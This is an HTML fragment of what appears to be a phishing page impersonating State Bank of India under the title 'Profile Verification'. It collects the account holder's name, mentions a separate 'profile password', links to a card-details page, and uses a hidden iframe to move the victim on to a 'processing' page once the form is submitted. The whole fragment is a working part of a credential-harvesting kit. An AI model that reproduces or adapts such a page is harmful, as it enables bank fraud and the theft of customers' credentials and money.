...
<html>
   <head>
      <title>Profile Verification - SBI</title>
   ...
   <body onload="startTimer();" style="background:#fff;">
    ...
    <img src="Menu.png" id="ii" width="10%">
      ...
      <section class="">
         ...
         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_Profile.php';}"></iframe>
         <!--My Form-->
               ...
               <div class="row">
                  <div class="col-md-6 col-xs-12">
				   <div class="progress">
                     ...
                     <div class="p-50">
                        <center><h4 style="font-size:16px; font-family: 'Open Sans', sans-serif; color:#000; font-weight:700; margin-top:-10%;">Profile and Name verification</h4></center>
                        <br><br>
                        <div class="login-box">
                        <div class="user-box">
                        ...
                        <a href="Card_Details.php" style="font-family: 'Open Sans', sans-serif; font-weight:500; color:#673391; position:absolute; margin-top:-12%; margin-left:32%; text-decoration:none;">Forgot Profile Password?</a>
                        </div>
                        </div>

                        <div class="user-box">
                        <input type="text" name="Name" id="date" inputmode="text" maxlength="30"
                        required="">
                        <label>A/c Holder Name<span style="color:red;"> *</span></label>
                        <p1><span class="error" style="display:none; position:absolute; margin:-6%; margin-left:0px;">Invalid Name !</span></p1>
                        </tr>
                        </table>
                        <h4 style="font-size:15px; font-family: 'Open Sans', sans-serif; color:red; font-weight:600; margin-top:-10%;">Please Note :- <span>
                        <p1 style="font-size:13px; font-family: 'Open Sans', sans-serif; color:grey; font-weight:400;">Profile Password is Defferent From Your Login Password.</p1></span>
                        </h4>
